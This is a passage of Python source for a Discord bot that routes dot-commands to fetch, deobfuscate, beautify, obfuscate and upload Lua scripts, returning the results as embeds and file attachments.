            raw = await fetch_from_url(url)
            if not raw:
                return await _safe_edit(f, content=\"empty response\")
            raw   = _mask_host_ip_bytes(raw)
            txt   = raw.decode(\"utf-8\", errors=\"ignore\")
            took  = time.perf_counter() - t_start
            preview = _strip_mentions(\"\\n\".join(txt.splitlines()[:30]))[:1000]
            embed = discord.Embed(title=\"Fetched\",
                description=f\"```lua\\n{preview}\\n```\", color=0x2b2d31)
            embed.set_footer(text=_make_footer(took))
            await f.delete()
            await _safe_reply(message, embed=embed,
                file=discord.File(io.BytesIO(raw), filename=\"fetched.lua\"))
        except Exception as e:
            em = discord.Embed(
                description=f\"{EMOJI_FAIL} fetch failed:\\n```{_strip_mentions(_sanitize_error(str(e)))[:1900]}```\",
                color=BAD)
            em.set_footer(text=_make_footer())
            await _safe_edit(f, content=None, embed=em)
        return

    if re.match(r'^\\.lph(\\s|$)', content, re.I):
        await _handle_lph_command(message, content)
        return

    if content.startswith(\".promdeobf\"):
        await _handle_engine_command(message, content, \".promdeobf\", run_promdeobf,
            \"decrypting\", \"decrypted.lua\", \"Prometheus Deobf\")
        return

    if content.startswith(\".beautify\"):
        await _handle_engine_command(message, content, \".beautify\", run_beautify,
            \"beautifying\", \"beautified.lua\", \"Beautified\")
        return

    if content.startswith(\".moonsec\"):
        await _handle_engine_command(message, content, \".moonsec\", run_moonsec,
            \"decrypting moonsec\", \"moonsec_decrypted.lua\", \"MoonSec Deobf\")
        return

    if re.match(r'^\\.obf(\\s|$)', content, re.I):
        await _handle_obf_command(message, content)
        return

    if re.match(r'^\\.upload(\\s|$)', content, re.I):
        await _handle_upload_command(message, content)
        return

    if content.startswith(\".deobf\"):
        await _handle_detect_or_dispatch(message, content, \".deobf\")
        return

    if content.startswith(\".wyn\"):
        await _handle_engine_command(message, content, \".wyn\", run_wyn,
            \"processing wyn\", \"wyn_output.lua\", \"Wynfuscate Output\")
        return

    if content.startswith(\".constant\"):
        await _handle_engine_command(message, content, \".constant\", run_constant,
            \"dumping constants\", \"constants_output.lua\", \"Constant Dump\")
        return

    if content.startswith(\".rename\"):
        await _handle_rename_command(message, content)
        return

    if content.startswith(\".l3\"):
        await _handle_detect_or_dispatch(message, content, \".l3\")
        return

    if content.startswith(\".l2\"):
        await _handle_detect_or_dispatch(message, content, \".l2\")
        return

    if re.match(r'^\\.l(\\s|$)', content):
        await _handle_detect_or_dispatch(message, content, \".l\")
        return

    await bot.process_commands(message)

if __name__ == \"__main__\":
    bot.run(TOKEN)")
